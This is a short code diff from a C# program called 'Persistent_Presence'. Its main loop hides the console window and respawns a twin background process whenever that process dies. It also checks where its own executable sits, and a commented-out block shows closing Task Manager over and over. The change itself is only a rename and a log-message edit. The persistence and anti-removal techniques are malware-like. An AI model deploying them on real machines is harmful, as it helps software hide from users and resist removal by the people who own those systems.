@@ -20,21 +20,22 @@ namespace Persistent_Presence
 
         static void Main(string[] args)
         {
+
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE); // Hide
 
-            Persistent_Presence main_program = new Persistent_Presence();
+            Persistent_Presence persistent_presence_object = new Persistent_Presence();
             Background_Process_Twin backround_twin_process = new Background_Process_Twin();
+            
             while (true)
             {
                 Thread.Sleep(1000); // Sleep reduces CPU Usage from 40% down to 2.1%.
                 if (backround_twin_process.check_processes() == false)
                 {
-                    Debug.WriteLine("[*] Duplicate Process Dead [2]");
+                    Debug.WriteLine("[*] Duplicate Process Dead");
                     backround_twin_process.execute_twin_process();
                 }
-
-                main_program.check_executable_location();
+                persistent_presence_object.check_executable_location();
                 /*
                 #region Example of practical usage (Continuously closes task manager).
                 try
